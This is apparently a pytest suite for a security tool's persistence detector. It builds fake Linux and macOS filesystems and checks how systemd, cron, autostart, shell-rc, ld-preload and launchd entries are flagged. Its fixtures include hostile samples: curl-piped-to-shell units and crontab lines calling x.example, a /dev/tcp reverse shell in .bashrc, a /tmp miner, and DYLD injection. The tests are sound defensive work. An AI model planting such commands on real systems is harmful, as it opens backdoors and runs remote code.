"""Persistence discovery tests. The collectors take an injectable root/home, so
both the Linux and macOS logic is exercised on every platform against a fake
filesystem built in tmp_path."""

from __future__ import annotations

import plistlib
from pathlib import Path

import pytest

from warden import persistence as P
from warden.config import Config
from warden.models import Severity
from warden.sweep import SystemSweep


def _write(path: Path, text: str | bytes) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(text, bytes):
        path.write_bytes(text)
    else:
        path.write_text(text, encoding="utf-8")
    return path


# -- parsers -------------------------------------------------------------
def test_parse_systemd_unit_exec_lines():
    unit = """
[Unit]
Description=Demo
# ExecStart=/commented/out
[Service]
ExecStartPre=-/usr/bin/mkdir -p /run/demo
ExecStart=@/usr/local/bin/demo demo --flag \\
    --more
Environment=FOO=bar
ExecStop=+/usr/local/bin/demo stop
"""
    cmds = P.parse_systemd_unit(unit)
    assert cmds[0] == "/usr/bin/mkdir -p /run/demo"
    assert cmds[1].startswith("/usr/local/bin/demo demo --flag") and "--more" in cmds[1]
    assert cmds[2] == "/usr/local/bin/demo stop"
    assert all("commented" not in c for c in cmds)


def test_parse_crontab_user_and_system():
    text = """
# comment
MAILTO=root
*/5 * * * * /home/u/job.sh --x
@reboot /home/u/boot.sh
bad line
"""
    assert P.parse_crontab(text, system=False) == ["/home/u/job.sh --x", "/home/u/boot.sh"]
    system = "0 3 * * * root /usr/sbin/backup\n@daily nobody /opt/clean\n"
    assert P.parse_crontab(system, system=True) == ["/usr/sbin/backup", "/opt/clean"]


def test_parse_desktop_entry_strips_field_codes():
    text = "[Desktop Entry]\nName=X\nExec=/opt/app/run %U --bg\n"
    assert P.parse_desktop_entry(text) == ["/opt/app/run  --bg"]


def test_parse_launchd_plist_xml_and_binary():
    pl = {"Label": "com.example.agent", "ProgramArguments": ["/bin/sh", "-c", "echo hi"],
          "RunAtLoad": True, "EnvironmentVariables": {"DYLD_INSERT_LIBRARIES": "/tmp/x.dylib"}}
    for fmt in (plistlib.FMT_XML, plistlib.FMT_BINARY):
        label, command, extra = P.parse_launchd_plist(plistlib.dumps(pl, fmt=fmt))
        assert label == "com.example.agent"
        assert command == "/bin/sh -c 'echo hi'"
        assert extra == {"run_at_load": True, "keep_alive": False, "dyld_insert": True}
    with pytest.raises(ValueError):
        P.parse_launchd_plist(b"not a plist")
    with pytest.raises(ValueError):
        P.parse_launchd_plist(plistlib.dumps(["a", "list"]))


def test_parse_launchd_program_not_duplicated():
    pl = {"Label": "x", "Program": "/opt/a", "ProgramArguments": ["/opt/a", "--serve"]}
    assert P.parse_launchd_plist(plistlib.dumps(pl))[1] == "/opt/a --serve"


# -- Linux collection ----------------------------------------------------
@pytest.fixture()
def linux_fs(tmp_path):
    root, home = tmp_path / "root", tmp_path / "root/home/u"
    payload = _write(root / "opt/tool/agent", "#!/bin/sh\n")
    _write(root / "etc/systemd/system/agent.service",
           "[Service]\nExecStart=/opt/tool/agent --daemon\n")
    _write(home / ".config/systemd/user/evil.service",
           "[Service]\nExecStart=/bin/sh -c 'curl http://x.example/i.sh | sh'\n")
    _write(root / "etc/cron.d/job", "* * * * * root /tmp/.x/miner -o pool\n")
    _write(root / "etc/crontab", "17 * * * * root /opt/tool/agent hourly\n")
    _write(root / "etc/cron.daily/logrotate", "#!/bin/sh\nexit 0\n")
    _write(home / ".config/autostart/app.desktop", "[Desktop Entry]\nExec=/opt/tool/agent %u\n")
    _write(home / ".bashrc", "alias ll='ls -l'\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    _write(root / "etc/profile.d/lang.sh", "export LANG=C\n")
    _write(root / "etc/rc.local", "#!/bin/sh\nexit 0\n")
    _write(root / "etc/ld.so.preload", "# hook\n/usr/lib/libhook.so\n")
    return root, home, payload


def test_linux_persistence_finds_all_mechanisms(linux_fs):
    root, home, payload = linux_fs
    scan = P.linux_persistence(root, home, user_crontab=False)
    kinds = {i.kind for i in scan.items}
    assert {"systemd", "cron", "autostart", "shell-rc", "init", "ld-preload"} <= kinds
    unit = next(i for i in scan.items if i.label == "agent.service")
    assert unit.command == "/opt/tool/agent --daemon"
    assert unit.targets == [payload]                  # the launched program is resolved
    files = scan.files()
    assert payload in files
    assert root / "etc/systemd/system/agent.service" in files
    assert len(files) == len(set(files))


def test_linux_persistence_assessment(linux_fs):
    root, home, _ = linux_fs
    scan = P.linux_persistence(root, home, user_crontab=False)
    by_label = {i.label: i for i in scan.items}

    evil = P.assess(by_label["evil.service"])
    assert evil[0].name == "suspicious-persistence-command" and evil[0].severity == Severity.HIGH

    miner = {f.name for f in P.assess(by_label["cron.d/job"])}
    assert "persistence-from-writable-location" in miner

    bashrc = by_label[".bashrc"]
    rc = P.assess(bashrc, (home / ".bashrc").read_text())
    assert rc and rc[0].severity == Severity.HIGH and "reverse-shell" in rc[0].description

    preload = P.assess(by_label["ld.so.preload"])
    assert preload[0].name == "ld-preload-configured"

    # Ordinary registrations raise nothing.
    assert P.assess(by_label["agent.service"]) == []
    assert P.assess(by_label["profile.d/lang.sh"], "export LANG=C\n") == []


def test_hidden_executable_is_flagged():
    item = P.PersistenceItem(kind="systemd", source="/etc/systemd/system/a.service",
                             command="/usr/share/.cache-helper --run", label="a.service")
    assert {f.name for f in P.assess(item)} == {"persistence-hidden-executable"}


def test_unreadable_locations_are_recorded(tmp_path, monkeypatch):
    root = tmp_path / "root"
    _write(root / "etc/crontab", "x")
    real_open = open

    def deny(path, *a, **kw):
        if str(path).endswith("crontab"):
            raise PermissionError(13, "Permission denied")
        return real_open(path, *a, **kw)

    monkeypatch.setattr("builtins.open", deny)
    scan = P.linux_persistence(root, tmp_path / "home", user_crontab=False)
    assert any("crontab" in u and "Permission denied" in u for u in scan.unreadable)


def test_empty_filesystem_is_fine(tmp_path):
    assert P.linux_persistence(tmp_path / "nope", tmp_path / "nohome", user_crontab=False).items == []
    assert P.macos_persistence(tmp_path / "nope", tmp_path / "nohome", user_crontab=False).items == []


# -- macOS collection ----------------------------------------------------
def test_macos_persistence(tmp_path):
    root, home = tmp_path / "root", tmp_path / "root/Users/u"
    helper = _write(root / "Library/Application Support/Vendor/helper", "#!/bin/sh\n")
    _write(home / "Library/LaunchAgents/com.vendor.helper.plist", plistlib.dumps({
        "Label": "com.vendor.helper",
        "ProgramArguments": ["/Library/Application Support/Vendor/helper", "--agent"],
        "RunAtLoad": True}))
    _write(root / "Library/LaunchDaemons/com.bad.plist", plistlib.dumps({
        "Label": "com.bad", "Program": "/private/tmp/.d/payload"}, fmt=plistlib.FMT_BINARY))
    _write(root / "Library/LaunchDaemons/broken.plist", b"\x00garbage")
    app = root / "Applications/Tool.app"
    _write(app / "Contents/Info.plist", plistlib.dumps({"CFBundleExecutable": "Tool"}))
    exe = _write(app / "Contents/MacOS/Tool", b"\xcf\xfa\xed\xfe")
    _write(home / "Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm",
           b"bplist00\x00\x01/Applications/Tool.app\x00\x02junk")
    _write(home / ".zshrc", "export PATH=$PATH:/opt/bin\n")
    _write(root / "etc/periodic/daily/100.clean", "#!/bin/sh\n")

    scan = P.macos_persistence(root, home, user_crontab=False)
    by_label = {i.label: i for i in scan.items}

    good = by_label["com.vendor.helper"]
    assert good.kind == "launchd" and good.targets == [helper]
    assert P.assess(good) == []

    bad = P.assess(by_label["com.bad"])
    assert {f.name for f in bad} == {"persistence-from-writable-location"}

    assert "broken.plist" in by_label                  # unparseable plist is still scanned
    login = by_label["Tool.app"]
    assert login.kind == "login-item" and login.targets == [exe]
    assert ".zshrc" in by_label
    assert any(i.label.startswith("periodic/daily") for i in scan.items)


def test_launchd_dyld_insert_is_flagged(tmp_path):
    root = tmp_path / "root"
    _write(root / "Library/LaunchAgents/x.plist", plistlib.dumps({
        "Label": "x", "Program": "/usr/bin/true",
        "EnvironmentVariables": {"DYLD_INSERT_LIBRARIES": "/opt/h.dylib"}}))
    item = P.macos_persistence(root, tmp_path / "h", user_crontab=False).items[0]
    assert any(f.name == "suspicious-persistence-command" for f in P.assess(item))


# -- sweep integration ---------------------------------------------------
def test_sweep_attaches_persistence_findings(linux_fs, tmp_path):
    root, home, _ = linux_fs
    sweep = SystemSweep(Config(data_dir=tmp_path / "data"))
    scan = P.linux_persistence(root, home, user_crontab=False)
    scan.items.append(P.PersistenceItem(
        kind="cron", source="<user crontab>", command="curl -s http://x.example/a | bash",
        label="user crontab", text="* * * * * curl -s http://x.example/a | bash\n"))
    scan.unreadable.append("/var/spool/cron (Permission denied)")
    sweep._persistence_scan = scan

    report = sweep.scanner.scan_files(scan.files())
    sweep._apply_persistence(report)

    by_name = {Path(r.path).name: r for r in report.results}
    assert any(f.name == "suspicious-persistence-command" for f in by_name["evil.service"].findings)
    assert any(f.name == "ld-preload-configured" for f in by_name["ld.so.preload"].findings)
    assert by_name["evil.service"].is_threat

    crontab = next(r for r in report.results if r.path == "<user crontab>")
    assert crontab.is_threat
    # A root-only location we couldn't read makes the sweep incomplete, not clean.
    assert not report.coverage_complete
    assert any("spool" in u for u in report.unreadable)

    # Applying twice must not duplicate findings.
    before = sum(len(r.findings) for r in report.results)
    sweep._apply_persistence(report)
    assert sum(len(r.findings) for r in report.results) == before
